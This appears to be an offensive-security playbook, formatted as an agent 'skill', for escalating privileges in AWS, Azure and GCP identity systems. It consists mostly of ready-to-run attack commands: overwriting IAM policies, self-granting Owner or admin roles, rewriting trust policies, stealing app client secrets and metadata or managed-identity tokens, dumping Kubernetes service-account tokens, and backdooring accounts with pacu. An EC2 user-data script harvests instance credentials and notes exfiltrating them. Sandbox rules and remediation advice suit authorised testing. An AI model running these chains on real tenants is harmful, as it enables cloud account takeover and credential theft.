# Cloud Identity Privilege Escalation — Skill Playbook

**Mitre ATT&CK ID:** T1078 (Valid Accounts) / T1098 (Account Manipulation)
**OWASP Mapping:** A01:2021 – Broken Access Control
**Severity:** Critical / High
**Last Updated:** 2026-08-04

---

## Metadata

```yaml
skill_id: cloud-identity-privesc-v1
category: cloud-identity
author: HiveBreach
mitre_attack_id: T1078
owasp_mapping:
  - A01:2021-Broken Access Control
tags:
  - cloud-identity
  - privilege-escalation
  - iam
  - aws
  - azure
  - gcp
  - T1078
  - T1098
  - T1530
  - T1552.005
  - T1484
  - T1613
environments:
  - aws
  - azure
  - gcp
verification_required: sandbox
```

---

## 1. Detection

Cloud privilege escalation begins with understanding *who you are* and *what you can do*. Detection is broken into identity discovery and permission enumeration. Never assume the initial credential is the highest privilege available.

### 1.1 AWS Identity & Permission Discovery

**Identify the current identity:**
```bash
# Current caller identity
aws sts get-caller-identity

# Enumerate inline and attached policies
aws iam list-attached-user-policies --user-name <user>
aws iam get-user-policy --user-name <user> --policy-name <policy>
aws iam list-attached-role-policies --role-name <role>
aws iam list-attached-group-policies --group-name <group>

# All principals with assume-role capability (potential escalation targets)
aws iam list-roles --query 'Roles[].{RoleName:RoleName,Arn:Arn,AssumeRolePolicyDocument:AssumeRolePolicyDocument}'

# Identify the current user's effective policies (union of user + groups)
aws iam list-groups-for-user --user-name <user>
```

**Detect common privesc primitives (Rhino Security Labs methodology):**
| Permission | Escalation Primitive |
|---|---|
| `iam:CreatePolicyVersion` | Overwrite a policy with `--set-as-default` |
| `iam:CreateAccessKey` | Create an access key for any user (incl. admin) |
| `iam:AttachUserPolicy` / `AttachRolePolicy` | Attach `AdministratorAccess` to self |
| `iam:PutUserPolicy` / `PutRolePolicy` | Inline policy injection |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with an elevated instance profile |
| `iam:PassRole` + `lambda:CreateFunction` | Swap execution role to an elevated role |
| `iam:UpdateAssumeRolePolicy` | Trust-policy rewrite → STS AssumeRole |
| `sts:AssumeRole` | Chain to a role with broader permissions |
| `iam:CreatePolicy` + `AttachRolePolicy` | Create + attach custom admin policy |
| `iam:AddUserToGroup` | Add self to an admin group |

### 1.2 Azure / Entra ID Identity & Permission Discovery

**Identify the current identity and role assignments:**
```bash
# Who am I
az account show
az ad signed-in-user show

# My role assignments across subscriptions
az role assignment list --assignee <objectId> --all

# All roles I can assign (permission to grant = escalation vector)
az role definition list --custom-role-only true

# Entra ID directory roles (Privileged Role Administrator, Global Administrator...)
az rest --method GET --uri "https://graph.microsoft.com/v1.0/me/memberOf"
az rest --method GET --uri "https://graph.microsoft.com/v1.0/me/transitiveMemberOf"
```

**PowerShell equivalent:**
```powershell
Get-AzRoleAssignment -Scope /subscriptions/<sub-id> | Where-Object {$_.SignInName -eq $user}
Get-MgDirectoryRoleAssignment -Filter "principalId eq '$id'"
```

### 1.3 GCP Identity & Permission Discovery

**Identify the current identity and permissions:**
```bash
# Who am I
gcloud auth list
gcloud config get-value account

# Effective IAM permissions on a project
gcloud projects get-iam-policy <project-id> --flatten="bindings[].members" --format="table(bindings.role, bindings.members)"

# Test specific permissions (e.g. can I grant IAM roles?)
gcloud projects get-iam-policy <project-id> --filter="bindings.role:roles/iam.securityAdmin" --flatten="bindings[].members"
gcloud iam roles list --project <project-id>
gcloud iam service-accounts list --project <project-id>
```

**Service account (SA) discovery:**
```bash
# SAs I can impersonate (act-as) — check iam.serviceAccounts.getAccessToken / getOpenIdToken
gcloud iam service-accounts list --project <project-id>
gcloud auth print-access-token --impersonate-service-account <sa>@<project>.iam.gserviceaccount.com
```

### 1.4 Enumeration Tooling — Full Permission Inventory

Run cloud-config auditors to diff *effective* permissions against the *current* identity:

```bash
# AWS — enumerate all escalation paths from the current credentials
prowler aws --group iam -o prowler-iam/
cloudsplaining scan --input-file policy-dump.json
pacu --exec iam__privesc_scan

# Azure — enumerate Entra ID attack paths
MicroBurst.ps1 > Invoke-MicroBurst -Verbose
AzureHound (BloodHound) → azurehound collect
az rest --method POST --uri "https://graph.microsoft.com/v1.0/me/getMemberGroups" --body '{"securityEnabledOnly": true}'

# GCP — enumerate IAM + SA chains
GCPwn -escalate
ScoutSuite gcp --profile <profile>
```

---

## 2. Confirmation

Privilege escalation must be **deterministically confirmed** — never assumed from policy text alone. Policy documents list *allowed* actions; effective permissions may be constrained by identity-based vs resource-based policy interaction, `NotAction` clauses, org-level policies (SCP, Azure Management Groups, GCP Org Policies), and session policies.

### 2.1 AWS Confirmation

| Check | Command | Expected on Success |
|---|---|---|
| Identity changed | `aws sts get-caller-identity` | Different `Arn` than start |
| New permission effective | `aws iam get-user --user-name admin` | Returns data (previously denied) |
| Attach succeeded | `aws iam list-attached-user-policies --user-name <me>` | Admin policy present |
| AssumeRole worked | `aws sts assume-role --role-arn <target>` | Temporary creds returned |
| EC2 instance profile reached | `aws ec2 describe-instances` | Hosts listed with metadata IP |
| Lambda role swapped | `aws lambda get-function --function-name <fn>` | Execution role now elevated |

**Order-of-confirmation rule:** test the *narrowest* privilege first (e.g. `sts:GetCallerIdentity`, `iam:GetUser`) before running broad read actions.

### 2.2 Azure Confirmation

| Check | Command | Expected on Success |
|---|---|---|
| Role assignment visible | `az role assignment list --assignee <me> --all` | `AdministratorAccess` / Owner listed |
| Entra role promoted | `az rest --method GET --uri "https://graph.microsoft.com/v1.0/me/memberOf"` | `Global Administrator` group |
| App secret usable | `az rest --method POST --uri "https://graph.microsoft.com/v1.0/oauth2/token" --body "client_id=..&client_secret=..&grant_type=client_credentials"` | Token for target app |
| Managed Identity token | `curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=..."` | Access token returned |
| PIM activation | `az rest --method POST --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"` | Role active |

### 2.3 GCP Confirmation

| Check | Command | Expected on Success |
|---|---|---|
| SA impersonation works | `gcloud auth print-access-token --impersonate-service-account <sa>@<project>.iam.gserviceaccount.com` | Valid OAuth token |
| New role grants you access | `gcloud projects get-iam-policy <project>` then `gcloud storage ls` | Previously denied bucket now listable |
| Workload identity binding accepted | `gcloud iam service-accounts add-iam-policy-binding <sa> --member="serviceAccount:<ns>@<project>.iam.gserviceaccount.com"` | Binding succeeds |
| GKE cluster-admin effective | `kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa>` | `yes` |

---

## 3. Exploitation

### 3.1 AWS — IAM Privilege Escalation Chains (Rhino Security Labs Methodology)

**Chain 1 — `iam:CreatePolicyVersion` (overwrite existing policy):**
```bash
# Victim admin policy exists; overwrite with escalation
aws iam create-policy-version --policy-arn arn:aws:iam::<acct>:policy/MyPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Verify
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <me>
```

**Chain 2 — `iam:AttachRolePolicy` / `iam:AttachUserPolicy`:**
```bash
aws iam attach-user-policy --user-name <me> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# or
aws iam attach-role-policy --role-name <role> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**Chain 3 — `iam:PassRole` + `ec2:RunInstances` (metadata SSRF → instance profile):**
```bash
# Find an instance profile with elevated permissions
aws iam list-instance-profiles

# Launch an instance using the elevated profile
aws ec2 run-instances --image-id ami-<elevated> --instance-type t3.micro \
  --iam-instance-profile Name=<elevated-profile> \
  --user-data "#!/bin/bash
   curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<elevated-profile> | tee /tmp/creds.txt
   # exfiltrate creds via reverse shell / SSRF callback"

# From the instance: curl the metadata service
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Chain 4 — `iam:PassRole` + `lambda:CreateFunction` (execution role swap):**
```bash
aws lambda create-function --function-name privesc \
  --runtime python3.11 --role arn:aws:iam::<acct>:role/<elevated-role> \
  --handler lambda_function.lambda_handler --zip-file fileb://fn.zip

aws lambda invoke --function-name privesc /tmp/out.json
# lambda_handler reads the elevated role creds via STS + environment
```

**Chain 5 — `sts:AssumeRole` (trust chain to higher-privilege role):**
```bash
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/AdminRole --role-session-name privesc
# Use returned AccessKeyId/SecretAccessKey/SessionToken
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

**Chain 6 — `iam:UpdateAssumeRolePolicy` (rewrite trust policy to assume self):**
```bash
aws iam update-assume-role-policy --role-name AdminRole \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<acct>:user/<me>"},"Action":"sts:AssumeRole"}]}'
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/AdminRole --role-session-name owned
```

**Chain 7 — `iam:CreateAccessKey` for an admin user:**
```bash
aws iam create-access-key --user-name <admin-user>
# Pair the returned AccessKeyId/SecretAccessKey with AWS CLI
```

### 3.2 AWS — Resource-Based Policy Exploitation

**S3 bucket policy abuse (bucket grants cross-account or public write):**
```bash
# If you control a bucket policy (s3:PutBucketPolicy), grant yourself admin on the bucket
aws s3api put-bucket-policy --bucket target-bucket \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<acct>:user/<me>"},"Action":"s3:*","Resource":"arn:aws:s3:::target-bucket/*"}]}'

# Then read sensitive objects
aws s3 ls s3://target-bucket/
aws s3 cp s3://target-bucket/secret.txt .
```

**Role trust policy exploitation (cross-account trust + `sts:AssumeRole`):**
```bash
# Attacker-controlled account has an assumed role allowed by a victim role's trust policy
aws sts assume-role --role-arn arn:aws:iam::<victim-acct>:role/shared-role --role-session-name pivot
```

**Danger flag:** any permission that lets you write a *resource-based policy* on a resource you can read is an escalation primitive (S3, KMS, SQS, SNS, ECR, Secrets Manager via `PutSecretPolicy`).

### 3.3 Azure / Entra ID — Identity Attacks

**Attack 1 — Privileged Role Assignment (self-grant):**
```bash
# Requires roleAssignment write (e.g. User Access Administrator / Owner)
az role assignment create \
  --assignee <my-object-id> \
  --role "Owner" \
  --scope /subscriptions/<sub-id>

# Verify
az role assignment list --assignee <my-object-id> --all
```

**Attack 2 — App registration client secret theft:**
```bash
# Find app registrations and their credentials
az rest --method GET --uri "https://graph.microsoft.com/v1.0/applications?`$select=appId,id,displayName"
az rest --method GET --uri "https://graph.microsoft.com/v1.0/applications/<app-id>/addPassword"

# Reuse the stolen client_secret
curl -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "client_id=<appId>&client_secret=<stolen-secret>&grant_type=client_credentials&scope=https://graph.microsoft.com/.default"

# Graph API access as the app
curl -H "Authorization: Bearer <token>" "https://graph.microsoft.com/v1.0/me"
```

**Attack 3 — Managed Identity token theft (from a compromised VM/function):**
```bash
# On a compromised Azure resource with a managed identity
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"

# Use the token against ARM
curl -H "Authorization: Bearer <token>" "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

**Attack 4 — PIM misconfiguration (eligible vs active roles, approval bypass):**
```bash
# Discover PIM-eligible roles I hold
az rest --method GET --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilitySchedules?`$filter=principalId eq '<me>'"

# Self-activate a PIM role (if allowed — no approval required)
az rest --method POST --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests" \
  --body '{"action":"selfActivate","principalId":"<me>","roleDefinitionId":"<GlobalAdmin>","scheduleInfo":{"startDateTime":"...","expiration":{"type":"AfterDuration","duration":"PT1H"}}}'
```

**Attack 5 — Azure AD Kerberos (cloud Kerberos trust abuse):**
```bash
# Once you have Domain Admin on-prem and cloud Kerberos trust is enabled,
# request Azure AD-issued TGTs for cloud admin access
klist purge
# Use on-prem AD → Azure AD Kerberos → sign in as cloud users / SAs
```

**Attack 6 — App role / service principal abusable by `AppRoleAssignment.ReadWrite.All`:** grant any app (or your malicious app) high-privilege application roles like `GlobalAdmin.ReadWrite.All`, then use its client credentials.

### 3.4 GCP — Service Account & IAM Attacks

**Attack 1 — Service account impersonation (`iam.serviceAccounts.getAccessToken` / `actAs`):**
```bash
# List SAs, then impersonate the highest-privilege one
gcloud iam service-accounts list --project <project-id>
gcloud auth print-access-token --impersonate-service-account <sa>@<project>.iam.gserviceaccount.com
gcloud auth activate-service-account <sa>@<project>.iam.gserviceaccount.com --key-file=<tmp.json>

# Scope: getAccessToken lets you mint OAuth tokens without SA keys
```

**Attack 2 — Workload identity federation abuse (OIDC pool to SA):**
```bash
# If you control a workload identity pool/provider, mint federated tokens for a bound SA
# 1. Obtain an OIDC token for the attacker-controlled identity
# 2. Exchange it for a Google STS token (sts.googleapis.com)
curl -X POST "https://sts.googleapis.com/v1/token" \
  -d 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange&audience=//iam.googleapis.com/projects/<p>/locations/global/workloadIdentityPools/<pool>/providers/<provider>&subject_token=<OIDC-token>&subject_token_type=urn:ietf:params:oauth:token-type:jwt&scope=https://www.googleapis.com/auth/cloud-platform'
# 3. Use the STS token to get an SA token
```

**Attack 3 — IAM roles privesc (`roles/iam.securityAdmin` or `roles/owner`):**
```bash
# Grant your own user the owner role
gcloud projects add-iam-policy-binding <project-id> \
  --member="user:me@example.com" --role="roles/owner"

# Or grant your service account the securityAdmin role
gcloud projects add-iam-policy-binding <project-id> \
  --member="serviceAccount:<sa>@<project>.iam.gserviceaccount.com" --role="roles/iam.securityAdmin"

# Also check org-level: roles/resourcemanager.organizationAdmin at the org node
gcloud organizations get-iam-policy <org-id>
```

**Attack 4 — GCS bucket ACL exploitation:**
```bash
# If you have storage.objects.setIamPolicy / legacy ACL write
gsutil acl ch -u <email>:OWNER gs://target-bucket
gsutil acl get gs://target-bucket
gsutil cp gs://target-bucket/secret.txt .

# Read ACL to find objects others can read (misconfigured allUsers / allAuthenticatedUsers)
gsutil iam get gs://target-bucket
```

**Attack 5 — GKE cluster-admin via SA:**
```bash
# If your SA can create/use a K8s ServiceAccount with cluster-admin,
# or you can fetch cluster credentials
gcloud container clusters get-credentials <cluster> --zone <zone> --project <project-id>
kubectl auth can-i '*' '*' --namespace=<target>
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --user=<email>

# Steal GKE SA token keys if they're in secrets
kubectl get secrets -n kube-system -o json | jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | .data.token' | base64 -d
```

---

## 4. Tool-Specific Guidance

### 4.1 AWS

**pacu (offensive AWS exploitation framework):**
```bash
pacu
> set_keys
> exec iam__privesc_scan
> exec iam__backdoor_assume_role
> exec iam__backdoor_users_keys
> exec ec2__startup_shell_script
```

**prowler (defensive posture → attacker input):**
```bash
prowler aws --group iam --checks iam_check_<admin_policy_on_user> -o prowler-report/
prowler aws --category iam
```

**cloudsplaining (IAM policy risk analysis):**
```bash
cloudsplaining download --profile prod   # fetch policy dump
cloudsplaining scan --input-file default.json --output cloudsplaining-results/
```

**ScoutSuite:**
```bash
scout aws --profile prod
```

### 4.2 Azure

**MicroBurst:**
```powershell
Import-Module MicroBurst.ps1
Invoke-MicroBurst -Verbose
Invoke-AZRPRIVESC -Verbose   # enumerate exploitable role assignments
Invoke-AzureKeyVaultSecretDump
Invoke-MFASweep
```

**AzureHound + BloodHound (attack-path graphing):**
```bash
azurehound collect --tenant <tenant> --refresh-token
# Import JSON into BloodHound → look for paths to Global Administrator / Owner
```

**Stormspotter (attack surface graph):**
```bash
stormspotter collect -t <tenant> -u <user> -p <pass>
# Visualize VM ↔ SA ↔ role-assignment graph
```

**az cli + PowerShell:**
```powershell
Get-AzRoleAssignment | Where-Object {$_.RoleDefinitionName -eq "Owner"}
Get-MgApplication | ForEach-Object { Get-MgApplicationPasswordCredential -ApplicationId $_.Id }
```

### 4.3 GCP

**GCPwn (offensive GCP enumeration + privesc):**
```bash
GCPwn
> enumerate
> escalate
```

**ScoutSuite:**
```bash
scout gcp --profile prod
```

**gcloud + gsutil (manual):** impersonation, IAM binding grants, GCS ACL edits as covered in §3.4.

### 4.4 Cross-Provider

| Tool | Provider | Purpose |
|---|---|---|
| Pacu | AWS | Post-exploitation, privesc chain automation |
| Prowler | AWS | Posture/audit, privesc primitives |
| ScoutSuite | AWS/Azure/GCP | Multi-cloud configuration audit |
| cloudsplaining | AWS | IAM policy privilege analysis |
| AzureHound + BloodHound | Azure/Entra ID | Attack-path graphing |
| MicroBurst | Azure | Offensive Entra/ARM toolset |
| Stormspotter | Azure | Attack surface graphing |
| GCPwn | GCP | Offensive GCP framework |
| OAuth2-scanner / tFuzz | GCP | OAuth/SCP testing |

---

## 5. PoC Generation

Every finding must produce a reproducible Proof of Concept showing **identity change** and **new permission effective**.

### PoC Template

```markdown
## Cloud Identity Privilege Escalation — [FINDING_ID]

**Provider:** AWS / Azure / GCP
**Resource:** [account/tenant/project-id]
**Starting Identity:** [ARN / objectId / email]
**Escalation Primitive:** [permission/role]
**Ending Identity:** [elevated ARN / Global Admin / SA token]

### Attack Chain
1. Enumerated current permissions → found [primitive]
2. Executed [step] with [exact command]
3. Verified new capability: [command + output]

### Evidence
- [Screenshot / CLI output showing new identity]
- [Effective permission check output]
- [PII/data access demonstrated minimally]

### Impact
- [e.g. Full AWS account takeover / Entra Global Administrator / GCP org admin]
- Lateral movement potential: [yes/no + path]

### Remediation
- Least privilege (grant only the actions required)
- Enforce SCP / Azure Management Group / GCP Org Policy deny rules
- Require MFA + Conditional Access / AWS STS MFA + session policies
- Monitor `iam:AttachUserPolicy`, role-assignment writes, SA key creation
- Implement break-glass + emergency access with approval gates

### Reproduction Steps
1. [Exact command 1]
2. [Exact command 2]
3. [Verification command with expected output]
```

### Minimal PoC (any provider — run in sandbox only):
```bash
# AWS
aws iam attach-user-policy --user-name sandbox-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws iam list-attached-user-policies --user-name sandbox-user

# Azure
az role assignment create --assignee <sandbox-me> --role "Owner" --scope /subscriptions/<sandbox-sub> && az role assignment list --assignee <sandbox-me> --all

# GCP
gcloud projects add-iam-policy-binding <sandbox-project> --member="user:sandbox@example.com" --role="roles/owner" && gcloud projects get-iam-policy <sandbox-project> --filter="bindings.role=roles/owner"
```

---

## 6. Verification (Sandbox)

All cloud privilege escalation **must** be verified in isolated test accounts/projects before reporting. **Never** run against production or shared tenants.

### Sandbox Checklist
- [ ] Isolated AWS account / Azure subscription+tenant / GCP project dedicated to testing
- [ ] Test identities created with no production resource access
- [ ] Starting and ending identity recorded in the PoC
- [ ] Escalation replayed twice to confirm determinism
- [ ] No data modified or deleted; read-only demonstrations only
- [ ] All temporary credentials/SA keys revoked after test
- [ ] Role assignments / IAM bindings removed after test
- [ ] Cost guardrails enabled (budgets + alerts) on test projects

### Prohibited Actions
- Targeting production accounts, tenants, or orgs
- Attaching `*:*` policies to production roles
- Stealing/using real production SA keys or client secrets
- Persisting access (backdoor users, standing admin roles) beyond the test
- Any action that could trigger org-wide org policy / SCP change
- Exfiltrating real customer data

### Sandbox Cleanup
```bash
# AWS: detach + delete
aws iam detach-user-policy --user-name sandbox-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Azure: remove role assignment
az role assignment delete --assignee <sandbox-me> --role Owner --scope /subscriptions/<sandbox-sub>

# GCP: remove binding
gcloud projects remove-iam-policy-binding <sandbox-project> --member="user:sandbox@example.com" --role="roles/owner"
```

---

## 7. Provider-Specific Privilege Escalation Reference

### 7.1 AWS — Escalation Primitive Reference (Rhino Security Labs)

| Primitive | Action | Result |
|---|---|---|
| `iam:CreatePolicyVersion` | Overwrite with `--set-as-default` | Full policy control |
| `iam:SetDefaultPolicyVersion` | Flip default version | Full policy control |
| `iam:CreateAccessKey` | Key for any user | Assume identity |
| `iam:CreateLoginProfile` | Set password | Console access |
| `iam:UpdateLoginProfile` | Change password | Lockout/identity takeover |
| `iam:AttachUserPolicy` / `AttachRolePolicy` | Attach `AdministratorAccess` | Full account |
| `iam:PutUserPolicy` / `PutRolePolicy` / `PutGroupPolicy` | Inline policy | Full account |
| `iam:AddUserToGroup` | Join admin group | Group privileges |
| `iam:UpdateAssumeRolePolicy` | Rewrite trust | Assume target role |
| `sts:AssumeRole` | Chain | Higher-privilege role |
| `iam:PassRole` + `ec2:RunInstances` | Instance profile | Metadata creds |
| `iam:PassRole` + `lambda:CreateFunction` | Execution role | Lambda creds |
| `iam:PassRole` + `glue:CreateDevEndpoint` | Dev endpoint | AWS creds |
| `iam:CreateUser` + `AttachUserPolicy` | New admin user | Full account |
| `iam:CreatePolicy` + `AttachRolePolicy` | Custom admin policy | Full account |
| `iam:DeactivateMFADevice` | Disable MFA | Bypass MFA |
| `s3:PutBucketPolicy` | Bucket policy self-grant | Bucket ownership |
| `kms:PutKeyPolicy` | Key policy self-grant | KMS key abuse |

### 7.2 Azure — Escalation Primitive Reference

| Primitive | Role/Permission | Result |
|---|---|---|
| Self-role-assignment | `Microsoft.Authorization/roleAssignments/write` | Owner/Contributor on scope |
| Elevate to User Access Administrator | PIM / global elevation | Grant any role |
| App secret theft | App Admin / owner on app | Token as app |
| Managed Identity token | Contributor + access to VM/Functions | Token theft |
| PIM self-activation | PIM eligible without approval | Elevated role |
| Azure AD Kerberos | Cloud Kerberos trust | Cloud admin via on-prem |
| AppRoleAssignment.ReadWrite.All | Grant app roles | App-driven admin |
| Key Vault access | Secrets User/Backup | Secret dump |
| VM command execution | Virtual Machine Contributor | RCE → managed identity |
| Automation Runbook (Contributor) | Execute as account | Managed identity creds |

### 7.3 GCP — Escalation Primitive Reference

| Primitive | Role/Action | Result |
|---|---|---|
| SA impersonation | `iam.serviceAccounts.getAccessToken` / `actAs` | Token as SA |
| IAM grant | `roles/iam.securityAdmin` / `roles/owner` | Full project |
| Org IAM grant | `roles/resourcemanager.organizationAdmin` | Org-wide |
| Workload identity binding | `workloadIdentityUser` on bound SA | Federated tokens |
| GCS ACL | `storage.objects.setIamPolicy` | Bucket access |
| GKE cluster-admin | `container.clusters.update` + RBAC | K8s admin |
| KMS grant | `cloudkms.cryptoKeys.setIamPolicy` | Key material access |
| Dataflow/Cloud Run SA swap | pass SA via job creation | Token as SA |
| compute.instances.setMetadata | SSH key injection | VM compromise |

### 7.4 Escalation Chain Visualization

```
[Low-priv cloud identity]
        │
        ▼
[Enumerate permissions (prowler / MicroBurst / GCPwn)]
        │
        ▼
[Identify privesc primitive (iam:AttachRolePolicy / roleAssignment write / SA actAs)]
        │
        ▼
[Escalate to admin identity (AdminPolicy / Global Admin / org owner)]
        │
        ▼
[Post-exploitation: data from cloud storage (T1530), metadata API (T1552.005), containers (T1613)]
```

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1078 | Valid Accounts | Primary — entry identity |
| T1098 | Account Manipulation | Primary — privilege grants |
| T1530 | Data from Cloud Storage | Post-escalation data access |
| T1552.005 | Cloud Instance Metadata API | EC2/VM metadata credential theft |
| T1484 | Domain Policy Modification | Azure AD / on-prem domain trust abuse |
| T1546 | Event Triggered Execution | Lambda/function-driven persistence |
| T1613 | Container and Resource Discovery | GKE / AKS / EKS enumeration |
| T1021.007 | Remote Services: Cloud Services | Lateral movement via cloud APIs |
| T1106 | Native API | Cloud CLI/API exploitation |
| T1069 | Permission Groups Discovery | Role enumeration |

---

## 9. References

- MITRE ATT&CK T1078: https://attack.mitre.org/techniques/T1078/
- MITRE ATT&CK T1098: https://attack.mitre.org/techniques/T1098/
- MITRE ATT&CK T1530: https://attack.mitre.org/techniques/T1530/
- MITRE ATT&CK T1552.005: https://attack.mitre.org/techniques/T1552/005/
- MITRE ATT&CK T1484: https://attack.mitre.org/techniques/T1484/
- MITRE ATT&CK T1613: https://attack.mitre.org/techniques/T1613/
- Rhino Security Labs — AWS IAM Privilege Escalation Methods: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- Pacu (Rhino Security Labs): https://github.com/RhinoSecurityLabs/pacu
- Prowler: https://github.com/prowler-cloud/prowler
- cloudsplaining: https://github.com/salesforce/cloudsplaining
- ScoutSuite: https://github.com/nccgroup/ScoutSuite
- AzureHound: https://github.com/BloodHoundAD/AzureHound
- MicroBurst: https://github.com/NetSPI/MicroBurst
- Stormspotter: https://github.com/Azure/Stormspotter
- GCPwn: https://github.com/NetSPI/gcpwn
- GCP IAM role reference: https://cloud.google.com/iam/docs/understanding-roles
- GCP service account impersonation: https://cloud.google.com/iam/docs/service-account-impersonation
- Microsoft Entra ID privilege escalation guidance: https://learn.microsoft.com/en-us/security/operations/privileged-identity-management

---

*This playbook is for authorised security testing only. All verification must occur in isolated sandbox accounts/projects. Never attack production environments, shared tenants, or resources outside your explicit written authorization (ROE).*
